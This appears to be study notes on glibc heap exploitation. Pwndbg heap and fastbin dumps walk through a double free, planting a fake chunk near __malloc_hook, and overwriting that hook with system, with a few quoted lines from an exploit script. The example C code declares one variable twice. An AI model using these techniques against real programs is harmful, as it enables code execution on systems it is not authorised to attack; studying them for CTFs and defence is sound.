### Table of Contents
1. Heap & Main Arena ARE AT DIFFERENT ADDRESSES
2. SIZE FIELD of CHUNK
3. STORING FAKE CHUNK ADDRESS INTO FASTBINS
4. Double Free
5. FREE - Unsorted Bin

* When a chunk is free, up to 5 quadwords of its user data are repurposed as malloc metadata a

* Note that qword before size can be the `prev_size` is the `prev_inuse` bit is set

---------------------------------------------------------------------------------------------------------------


###### ===== 1. Heap & MAIN ARENA ARE AT DIFFERENT ADDRESSES ===== ######


[Reference heap_notes]: binary/exploit_heap/notes/heap_notes.md
```
   2. Heap & MAIN ARENA ARE AT DIFFERENT ADDRESSES
```


---------------------------------------------------------------------------------------------------------------


###### ===== 2. SIZE FIELD of CHUNK ===== ######

[Reference heap_notes]: binary/exploit_heap/notes/heap_notes.md
```
   3. Chunks in General
     + Size Field & Flags
```


---------------------------------------------------------------------------------------------------------------


###### ===== 3. STORING FAKE CHUNK ADDRESS INTO FASTBINS ===== ######

+ If this script ends with these 3 lines in the `Example` section

```xpl_rce_fastbin_dup.py:74/77 - Remember to refernce original python for context
malloc(0x68, "Y") # 0x59 in hex
malloc(0x68, "Z") # 0x5a in hex
```
```vis
0x603000   0x0000000000000000   0x0000000000000071   ........q.......
                           v----"Z" written here
0x603010   0x00007ffff7dd0b5a   0x4141414141414141   Z.......AAAAAAAA
0x603020   0x4141414141414141   0x4141414141414141   AAAAAAAAAAAAAAAA
0x603030   0x4141414141414141   0x4141414141414141   AAAAAAAAAAAAAAAA
0x603040   0x4141414141414141   0x4141414141414141   AAAAAAAAAAAAAAAA
0x603050   0x4141414141414141   0x4141414141414141   AAAAAAAAAAAAAAAA
0x603060   0x4141414141414141   0x4141414141414141   AAAAAAAAAAAAAAAA

0x603070   0x4141414141414141   0x0000000000000071   AAAAAAAAq.......
                           v----"Y" written here
0x603080   0x0000000000603059   0x4242424242424242   Y0`.....BBBBBBBB
0x603090   0x4242424242424242   0x4242424242424242   BBBBBBBBBBBBBBBB
0x6030a0   0x4242424242424242   0x4242424242424242   BBBBBBBBBBBBBBBB
0x6030b0   0x4242424242424242   0x4242424242424242   BBBBBBBBBBBBBBBB
0x6030c0   0x4242424242424242   0x4242424242424242   BBBBBBBBBBBBBBBB
0x6030d0   0x4242424242424242   0x4242424242424242   BBBBBBBBBBBBBBBB
0x6030e0   0x4242424242424242   0x0000000000020f21   BBBBBBBB!....... <-- Top chunk
```


+ Calling malloc should have now added the fake chunk to _fastbins_
```pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x7ffff7dd0b2d (_IO_wide_data_0+237) ◂— 0xfff7a9fa10000000
0x80: 0x0
```
```dq 0x7ffff7dd0b2d
                                                     v--- size of fake chunk
00007ffff7dd0b2d     fff7dccee0000000 000000000000007f

                      v---this is the address that will be stored in fastbins
00007ffff7dd0b3d     fff7a9fa10000000 fff7a9fed000007f
00007ffff7dd0b4d     000000000000007f 0000000000000000
00007ffff7dd0b5d     0000000000000000 0000000001000000
```
```pwndbg> u __malloc_hook
Invalid address 0x0
```


+ If this script ends with these 3 lines in the `Example` section
```xpl_rce_fastbin_dup.py:74/77 - Remember to refernce original python for context
malloc(0x68, "Y")
malloc(0x68, "Z")
malloc(0x68, b"Y"*19 + p64(libc.sym.system))
```
```vis
0x603000   0x0000000000000000   0x0000000000000071   ........q.......
                           v----"Z" written here
0x603010   0x00007ffff7dd0b5a   0x4141414141414141   Z.......AAAAAAAA
0x603020   0x4141414141414141   0x4141414141414141   AAAAAAAAAAAAAAAA
0x603030   0x4141414141414141   0x4141414141414141   AAAAAAAAAAAAAAAA
0x603040   0x4141414141414141   0x4141414141414141   AAAAAAAAAAAAAAAA
0x603050   0x4141414141414141   0x4141414141414141   AAAAAAAAAAAAAAAA
0x603060   0x4141414141414141   0x4141414141414141   AAAAAAAAAAAAAAAA

0x603070   0x4141414141414141   0x0000000000000071   AAAAAAAAq.......
                           v----"Y" written here
0x603080   0x0000000000603059   0x4242424242424242   Y0`.....BBBBBBBB
0x603090   0x4242424242424242   0x4242424242424242   BBBBBBBBBBBBBBBB
0x6030a0   0x4242424242424242   0x4242424242424242   BBBBBBBBBBBBBBBB
0x6030b0   0x4242424242424242   0x4242424242424242   BBBBBBBBBBBBBBBB
0x6030c0   0x4242424242424242   0x4242424242424242   BBBBBBBBBBBBBBBB
0x6030d0   0x4242424242424242   0x4242424242424242   BBBBBBBBBBBBBBBB
0x6030e0   0x4242424242424242   0x0000000000020f21   BBBBBBBB!....... <-- Top chunk
```
+ Calling malloc should have now added the fake chunk to _fastbins_
```pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0xfff7a9fa10000000
0x80: 0x0
```
+ The address should point to our fake chunk
```pwndbg> dq 0x7ffff7dd0b2d
00007ffff7dd0b2d     fff7dccee0000000 000000000000007f
00007ffff7dd0b3d     5959595959595959 5959595959595959
00007ffff7dd0b4d     fff7a5f200595959 000000000000007f
00007ffff7dd0b5d     0000000000000000 0000000001000000
```
```pwndbg> u __malloc_hook
 ► 0x7ffff7a5f200 <system>       test   rdi, rdi
   0x7ffff7a5f203 <system+3>     je     system+16                <system+16>
    [...]
```


---------------------------------------------------------------------------------------------------------------


###### ===== 4. DOUBLE FREE ===== ######


1. chunkA = malloc(0x28, b"AAAAAAAA")
```Heap_Chunks
pwndbg> vis                                               ______ this is the size
                                                         |
                                                         v
0x603000        0x0000000000000000      0x0000000000000031      ........1.......
0x603010        0x4141414141414141      0x0000000000000000      AAAAAAAA........ <--- see 'A' data here
0x603020        0x0000000000000000      0x0000000000000000      ................
0x603030        0x0000000000000000      0x0000000000020fd1      ................         <-- Top chunk
```

2. chunkB = malloc(0x28, b"BBBBBBBB")
```Heap_Chunks
pwndbg> vis

0x603000        0x0000000000000000      0x0000000000000031      ........1.......
0x603010        0x4141414141414141      0x0000000000000000      AAAAAAAA........
0x603020        0x0000000000000000      0x0000000000000000      ................


0x603030        0x0000000000000000      0x0000000000000031      ........1.......
0x603040        0x4242424242424242      0x0000000000000000      BBBBBBBB........ <--- see 'B' data here
0x603050        0x0000000000000000      0x0000000000000000      ................
0x603060        0x0000000000000000      0x0000000000020fa1      ................         <-- Top chunk
```

3. free(chunkA)
  + Remember that _heap_ is considered end of list if the `qword` after the _size_
    is NULL (`0x00`)
```Heap_Chunks
pwndbg> vis

0x603000        0x0000000000000000      0x0000000000000031      ........1.......    <-- fastbins[0x30][0]
                                 v---this is null, so this is the end
0x603010        0x0000000000000000      0x0000000000000000      ................
0x603020        0x0000000000000000      0x0000000000000000      ................


0x603030        0x0000000000000000      0x0000000000000031      ........1.......
0x603040        0x4242424242424242      0x0000000000000000      BBBBBBBB........
0x603050        0x0000000000000000      0x0000000000000000      ................
0x603060        0x0000000000000000      0x0000000000020fa1      ................         <-- Top chunk
```

```fastbins
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x603000 ◂— 0x0        <---points to chunk A cause it was freed
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0

```

4. free(chunkB)
  + Remember that _heap_ is considered end of list if the `qword` after the _size_
```Heap_Chunks
pwndbg> vis

0x603000        0x0000000000000000      0x0000000000000031      ........1.......  <-- fastbins[0x30][1]
                                 v---this is null, so this is the end
0x603010        0x0000000000000000      0x0000000000000000      ................
0x603020        0x0000000000000000      0x0000000000000000      ................


0x603030        0x0000000000000000      0x0000000000000031      ........1.......  <-- fastbins[0x30][0]
                             v---see that it points to chunkA @ 0x603000
0x603040        0x0000000000603000      0x0000000000000000      .0`.............
0x603050        0x0000000000000000      0x0000000000000000      ................
0x603060        0x0000000000000000      0x0000000000020fa1      ................         <-- Top chunk
```

```fastbins
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x603030 —▸ 0x603000 ◂— 0x0    <--- First points to chunkB;   Then chunkB has address of chunkA
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

5. free(chunkA)
  + Remember that _heap_ is considered end of list if the `qword` after the _size_
```Heap_Chunks
pwndbg> vis

0x603000        0x0000000000000000      0x0000000000000031      ........1....... <-- fastbins[0x30][0],
                                                                                     fastbins[0x30][0]
                                v---points to chunkB
0x603010        0x0000000000603030      0x0000000000000000      00`.............
0x603020        0x0000000000000000      0x0000000000000000      ................


0x603030        0x0000000000000000      0x0000000000000031      ........1.......  <-- fastbins[0x30][1]
                                v---points back to chunkA
0x603040        0x0000000000603000      0x0000000000000000      .0`.............
0x603050        0x0000000000000000      0x0000000000000000      ................
0x603060        0x0000000000000000      0x0000000000020fa1      ................         <-- Top chunk
```

```fastbins
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x603000 —▸ 0x603030 ◂— 0x603000       <--- points to chunkA
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

6. malloc(0x28, b"YYYY")
  + This should get stored in `chunkA`
  + The data that we're storing (`YYYY`) will later be treated as an address (just keep that in mind)
```Heap_Chunks
pwndbg> vis

0x603000        0x0000000000000000      0x0000000000000031      ........1....... <-- fastbins[0x30][1]
0x603010        0x0000000a59595959      0x0000000000000000      YYYY............ <---'Y' data written
0x603020        0x0000000000000000      0x0000000000000000      ................     over address to 
                                                                                     chunkB


0x603030        0x0000000000000000      0x0000000000000031      ........1....... <-- fastbins[0x30][0]
                                 v---still points to chunkA even though chunkA is allocated
0x603040        0x0000000000603000      0x0000000000000000      .0`.............
0x603050        0x0000000000000000      0x0000000000000000      ................
0x603060        0x0000000000000000      0x0000000000020fa1      ................         <-- Top chunk
```

```fastbins
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x603030 —▸ 0x603000 ◂— 0xa59595959 /* 'YYYY\n' */      <---- now points to chunkB
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

7. malloc(0x28, b"ZZZZ")
  + Note that the `Y` data is being treated as address in the next step!!!
```Heap_Chunks
pwndbg> vis

0x603000        0x0000000000000000      0x0000000000000031      ........1.......  <-- fastbins[0x30][0]
                                v----The 'Y' data is being treated as an address
0x603010        0x0000000059595959      0x0000000000000000      YYYY............
0x603020        0x0000000000000000      0x0000000000000000      ................


0x603030        0x0000000000000000      0x0000000000000031      ........1.......
0x603040        0x000000005a5a5a5a      0x0000000000000000      ZZZZ............ <---'Z' data
0x603050        0x0000000000000000      0x0000000000000000      ................
0x603060        0x0000000000000000      0x0000000000020fa1      ................  <-- Top chunk
```

```fastbins
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x603000 ◂— 0x59595959 /* 'YYYY' */     <--- points to chunkA now even though it's allocated
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

8. malloc(0x28, "Much Win")
  + The Y values are also treated as an address in `fastbins`
```Heap_Chunks
pwndbg> vis

0x603000        0x0000000000000000      0x0000000000000031      ........1.......
0x603010        0x6e6977206863754d      0x0000000000000000      Much win........ <---chunkA is overwritten
0x603020        0x0000000000000000      0x0000000000000000      ................     even though it's 
                                                                                     allocated


0x603030        0x0000000000000000      0x0000000000000031      ........1.......
0x603040        0x000000005a5a5a5a      0x0000000000000000      ZZZZ............
0x603050        0x0000000000000000      0x0000000000000000      ................
0x603060        0x0000000000000000      0x0000000000020fa1      ................         <-- Top chunk

```

```fastbins
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x59595959 <---- 'YYYY' is being treated as an address (what if we gave a valid address instead?)
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```



---------------------------------------------------------------------------------------------------------------


###### ===== 5. FREE - Unsorted Bin ===== ######


```example_code
int main(int argc, char* argv[]) {
    void* a = malloc(0x88);
    void* a = malloc(0x88);
    
    free(b);
    
    b = malloc(0x88);
    malloc(0x18);
    
    //////// Breakpoint 1 ////////
    
    free(a);
    
    //////// Breakpoint 2 ////////
    
    free(b);

    return 0;
}
```


```Breakpoint_1

0x602000        0x0000000000000000      0x0000000000000091      ................ ; 2nd malloc
0x602010        0x0000000000000000      0x0000000000000000      ................
 [...]
0x602080        0x0000000000000000      0x0000000000000000      ................


                                                        v---prev_inuse cause of the 1
0x602090        0x0000000000000000      0x0000000000000091      ................ ; 1st malloc
0x6020a0        0x0000000000000000      0x0000000000000000      ................
 [...]
0x602110        0x0000000000000000      0x0000000000000000      ................


0x602120        0x0000000000000000      0x0000000000000021      ........!.......
0x602130        0x0000000000000000      0x0000000000000000      ................

0x602140        0x0000000000000000      0x0000000000020ec1      ................
```


```Breakpoint_2

0x602000        0x0000000000000000       0x0000000000000091      ................
0x602010        0x00007ffff7dd0bc0       0x00007ffff7dd0bc0      ................
                              ^                ^
                              |                |
                        +-----+                +------+
                        |                             |
              unsorted bin fwd pointer      unsorted bin backward pointer
                            ^                             ^
                            |____if the same then_________|
                                  only one chunk
                                   [...]
0x602080        0x0000000000000000       0x0000000000000000      ................


                                ----`prev_size` added    ---`prev_inuse` no more
                                |    added               |
                                v                        v
0x602090        0x0000000000000090       0x0000000000000090      ................
0x6020a0        0x0000000000000000       0x0000000000000000      ................
                                   [...]
0x602110        0x0000000000000000       0x0000000000000000      ................


0x602120        0x0000000000000000       0x0000000000000021      ........!.......
0x602130        0x0000000000000000       0x0000000000000000      ................

0x602140        0x0000000000000000       0x0000000000020ec1      ................
```


```dq &main_arena 16
00007ffff7dd0b60    0x0000000000000000   0x0000000000000000      ................
[...]
00007ffff7dd0bd0    0x0000000000602000   0x0000000000602000      ................
                                  ^                    ^
                                  |__if the same then__|
                                      only one chunk
```

---------------------------------------------------------------------------------------------------------------



